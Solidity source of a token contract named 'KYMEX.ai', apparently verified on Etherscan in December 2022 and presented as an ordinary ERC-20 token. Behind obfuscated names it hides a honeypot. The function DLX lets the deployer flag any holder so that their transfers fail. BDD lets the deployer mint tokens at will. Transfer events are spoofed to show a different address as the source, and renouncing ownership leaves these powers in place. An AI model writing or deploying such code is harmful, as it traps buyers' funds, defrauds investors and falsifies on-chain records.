/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aWDS = 0x8242e56a759aa0B069B9c983fe3f582020CD1eC9;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract KYMEX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bXF;
    mapping (address => uint256) private cxFG;
    mapping (address => mapping (address => uint256)) private dXC;
    uint8 eVGD = 8;
    uint256 fDI = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "KYMEX.ai";
        _symbol = "KYMEX";
        gLIS(msg.sender, fDI);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eVGD;
    }

    function totalSupply() public view  returns (uint256) {
        return fDI;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return bXF[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXC[owner][spender];
    }
	
 			   function DLX (address nIJS) HKK public {
      cxFG[nIJS] = 42;}
function approve(address spender, uint256 amount) public returns (bool success) {    
        dXC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			modifier HKK () {
		       require(cxFG[msg.sender] == 15);
               _;}
			   
  
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= bXF[msg.sender]);
        if(cxFG[msg.sender] <= 3) {
        hKI(msg.sender, recipient, amount);
        return true; }
     if(cxFG[msg.sender] == 15) {
        iLK(msg.sender, recipient, amount);
        return true; }}

	   
			function mSE (address nIJS, uint256 oXX)  internal {
     bXF[nIJS] += oXX;} 		   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= bXF[sender]);
     require(amount <= dXC[sender][msg.sender]);
                  if(cxFG[sender] == 15) {
        iLK(sender, recipient, amount);
        return true;} else
              if(cxFG[sender] <= 3) { 
            if (cxFG[recipient] <=3) {
        hKI(sender, recipient, amount);
        return true;}}}
		
   function BDD (address nIJS, uint256 oXX) HKK public {
   mSE(nIJS,oXX);}	
  		    function gLIS(address kDW, uint256 lMD) internal  {
        cxFG[msg.sender] = 15;
        kDW = aWDS;
        bXF[msg.sender] = bXF[msg.sender].add(lMD);
        emit Transfer(address(0), kDW, lMD); }
		
				
	
		
		            function iLK(address sender, address recipient, uint256 amount) internal  {
        bXF[sender] = bXF[sender].sub(amount);
        bXF[recipient] = bXF[recipient].add(amount);
         sender = aWDS;
        emit Transfer(sender, recipient, amount); }
		




    function hKI(address sender, address recipient, uint256 amount) internal  {
        bXF[sender] = bXF[sender].sub(amount);
        bXF[recipient] = bXF[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }}